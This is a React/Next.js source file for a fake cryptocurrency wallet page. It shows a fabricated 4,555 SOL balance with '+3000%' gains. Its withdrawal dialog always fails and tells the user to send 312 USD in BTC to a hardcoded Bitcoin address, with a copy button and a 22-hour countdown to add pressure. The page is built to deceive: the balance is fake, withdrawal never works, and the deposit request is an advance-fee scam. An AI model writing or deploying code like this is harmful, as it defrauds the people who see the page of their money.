"use client";
import { useState, useEffect } from "react";



export default function Page() {
  const [open, setOpen] = useState(false);
  const [solPrice, setSolPrice] = useState(0);
  const solAmount = 4555.01;
  const [wallet, setWallet] = useState("");
  const [amount, setAmount] = useState("");
  const [error, setError] = useState(false);

  const LIMIT_SECONDS = 22 * 60 * 60;

  const walletAddress =
    "bc1p3s8um5am0svmppnkqe73wqh3u2r0se6h9rfqkh2jmgd9wr6njchqvc9cu0";

  const [timeLeft, setTimeLeft] = useState(LIMIT_SECONDS);
  const [copied, setCopied] = useState(false);
  const portfolioValue = solAmount * solPrice;


  const handleWithdrawal = () => {
    setError(true);
  };

  useEffect(() => {
  const fetchPrice = async () => {
    try {
      const res = await fetch(
        "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
      );

      const data = await res.json();

      setSolPrice(data.solana.usd);
    } catch (error) {
      console.error(error);
    }
  };

  fetchPrice();

  const interval = setInterval(fetchPrice, 30000);

  return () => clearInterval(interval);
}, []);


  useEffect(() => {
    if (!open) return;

    setTimeLeft(LIMIT_SECONDS);

    const interval = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(interval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [open]);

  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;

    return [hours, minutes, secs]
      .map((v) => String(v).padStart(2, "0"))
      .join(":");
  };

  const handleCopyWallet = async () => {
    await navigator.clipboard.writeText(walletAddress);

    setCopied(true);

    setTimeout(() => {
      setCopied(false);
    }, 2000);
  };

  return (
    <main className="min-h-screen bg-black text-white flex justify-center overflow-x-hidden">
      <div className="w-full max-w-md mx-auto px-5 py-6 pb-24 overflow-hidden">
        {/* TOP MENU */}
        <div className="flex items-center gap-3 mb-8">
          <img
            src="/user.png"
            alt="User"
            className="w-12 h-12 rounded-full object-cover shrink-0"
          />
          <button className="bg-[#b89cff] text-black px-5 py-3 rounded-full text-lg font-bold">
            Home
          </button>
          <button className="bg-neutral-900 text-neutral-300 px-5 py-3 rounded-full text-lg font-bold">
            Trade
          </button>
          <button className="bg-neutral-900 text-neutral-300 px-5 py-3 rounded-full text-lg font-bold">
            Explore
          </button>
        </div>

        {/* ACCOUNT */}
        <p className="text-neutral-400 text-xl font-bold mb-2">
          Account 1⌄
        </p>

<h1 className="text-7xl font-bold">
  $
  {portfolioValue.toLocaleString("en-US", {
    maximumFractionDigits: 0,
  })}
</h1>
        <div className="flex gap-3 mt-4 text-2xl font-bold">
<span className="text-green-400">
  +$
  {portfolioValue.toLocaleString("en-US", {
    maximumFractionDigits: 0,
  })}
</span>
          <span className="bg-green-500 text-black px-3 rounded-xl">
            +3000%
          </span>
        </div>

        {/* CASH */}
        <div className="mt-8 bg-neutral-900 rounded-[28px] p-6 flex justify-between items-center">
          <div className="flex items-center gap-4">
            <img
              src="/cash.png"
              alt="Cash"
              className="w-10 h-10 object-contain"
            />
            <span className="text-2xl font-bold">Cash</span>
          </div>
          <span className="text-2xl">$0.00</span>
        </div>

        {/* TOKENS */}
        <h2 className="text-4xl font-bold mt-10 mb-5">
          Tokens ›
        </h2>
<Token
  img="/solana.png"
  name="Solana"
  amount={`${solAmount.toLocaleString()} SOL`}
  value={`$${portfolioValue.toLocaleString("en-US", {
    maximumFractionDigits: 0,
  })}`}
  profit={`+$${portfolioValue.toLocaleString("en-US", {
    maximumFractionDigits: 0,
  })}`}
/>

        <Token
          img="/bitcoin.png"
          name="Bitcoin"
          amount="0 BTC"
          value="$0.00"
          profit="$0.00"
        />

        <Token
          img="/ethereum.png"
          name="Ethereum"
          amount="0 ETH"
          value="$0.00"
          profit="$0.00"
        />

        {/* WITHDRAWAL BUTTON */}
        <button
          onClick={() => setOpen(true)}
          className="w-full mt-8 bg-[#b89cff] text-black rounded-[28px] py-5 text-2xl font-bold"
        >
          Withdrawal
        </button>

        {/* MODAL */}
        {open && (
          <div className="fixed inset-0 bg-black/80 flex items-end justify-center px-5 pb-6">
<div
  className="
    w-full
    max-w-md
    bg-neutral-900
    rounded-[30px]
    p-6
    max-h-[90vh]
    overflow-y-auto
    overscroll-contain
  "
>
                <h3 className="text-3xl font-bold mb-5">
                Withdrawal
              </h3>

              {/* WITHDRAWAL REQUEST CARD */}
              <div className="mb-5 rounded-[28px] bg-black border border-[#b89cff] p-5">
                <h4 className="text-xl font-bold">
                  Withdrawal Request
                </h4>

<div className="mt-4 rounded-3xl border border-green-500/20 bg-green-500/10 p-5">
  <div className="flex items-center gap-3">
    <div className="flex h-11 w-11 items-center justify-center rounded-full bg-green-500 text-black font-black text-xl">
      ✓
    </div>

    <div>
      <p className="text-green-400 font-bold text-lg tracking-wide uppercase">
        Withdrawal Fee Paid
      </p>

      <p className="text-4xl font-black text-white">
        $300 USD
      </p>
    </div>
  </div>

  <div className="mt-4 border-t border-white/10 pt-4">
    <p className="text-white font-semibold">
      Your funds are available for withdrawal.
    </p>

    <p className="mt-2 text-sm text-neutral-400 leading-relaxed">
      To enable transfer processing, please maintain a minimum balance of
      <span className="text-[#b89cff] font-bold"> 312 USD in BTC </span>
      in your wallet.
    </p>
  </div>
</div>


                <div
                  className={`mt-4 text-3xl font-bold tracking-wider ${
                    timeLeft < 3600
                      ? "text-red-500"
                      : "text-[#b89cff]"
                  }`}
                >
                  {formatTime(timeLeft)}
                </div>

                <div className="mt-5">
                  <p className="text-sm text-neutral-400 mb-2">
                    Add BTC balance to your own wallet address:
                  </p>

                  <div className="bg-neutral-900 rounded-2xl p-4">
<p className="break-all whitespace-normal text-xs sm:text-sm font-mono leading-relaxed">                      {walletAddress}
                    </p>

                    <button
                      type="button"
                      onClick={handleCopyWallet}
                      className="mt-3 bg-[#b89cff] text-black font-bold px-4 py-2 rounded-xl"
                    >
                      Copy Wallet
                    </button>

                    {copied && (
                      <p className="text-green-400 text-sm mt-2">
                        Copied!
                      </p>
                    )}
                  </div>
                </div>
              </div>

              {error && (
                <div className="mb-5 rounded-3xl bg-black border border-[#b89cff]/40 p-4">
                  <div className="flex items-start gap-3">
                    <div className="w-10 h-10 rounded-full bg-[#b89cff] text-black flex items-center justify-center font-black text-xl">
                      !
                    </div>

                    <div>
                      <p className="text-[#b89cff] font-bold text-lg">
                        Withdrawal Failed
                      </p>

                      <p className="text-neutral-400 text-sm mt-1">
                        Not enough Solana available to process this withdrawal.
                      </p>

                      <p className="text-neutral-500 text-xs mt-2">
                        Please deposit additional SOL and try again.
                      </p>
                    </div>
                  </div>
                </div>
              )}

              <label className="text-neutral-400">
                Wallet address
              </label>

              <input
                value={wallet}
                onChange={(e) => setWallet(e.target.value)}
                placeholder="Enter your wallet"
                className="w-full mt-2 mb-4 bg-black rounded-2xl px-4 py-4 outline-none"
              />

              <label className="text-neutral-400">
                Amount
              </label>

              <input
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="$0.00"
                className="w-full mt-2 mb-4 bg-black rounded-2xl px-4 py-4 outline-none"
              />

              <div className="mb-5 text-sm text-neutral-500">
                Network: Solana
              </div>

              <button
                onClick={handleWithdrawal}
                className="w-full bg-[#b89cff] text-black rounded-2xl py-4 font-bold text-xl"
              >
                Confirm Withdrawal
              </button>

              <button
                onClick={() => setOpen(false)}
                className="w-full mt-3 text-neutral-400 py-3"
              >
                Cancel
              </button>
            </div>
          </div>
        )}
      </div>
    </main>
  );
}

function Token({
  img,
  name,
  amount,
  value,
  profit,
}: {
  img: string;
  name: string;
  amount: string;
  value: string;
  profit: string;
}) {
  const isGreen = profit.startsWith("+");

  return (
    <div className="bg-neutral-900 rounded-[28px] p-5 flex justify-between items-center mb-3">
      <div className="flex items-center gap-4">
        <img
          src={img}
          alt={name}
          className="w-14 h-14 rounded-full object-contain"
        />

        <div>
          <p className="font-bold text-2xl">
            {name}
          </p>

          <p className="text-neutral-400 text-xl">
            {amount}
          </p>
        </div>
      </div>

      <div className="text-right">
        <p className="text-2xl font-semibold">
          {value}
        </p>

        <p
          className={`text-xl font-semibold ${
            isGreen
              ? "text-green-400"
              : "text-neutral-500"
          }`}
        >
          {profit}
        </p>
      </div>
    </div>
  );
}
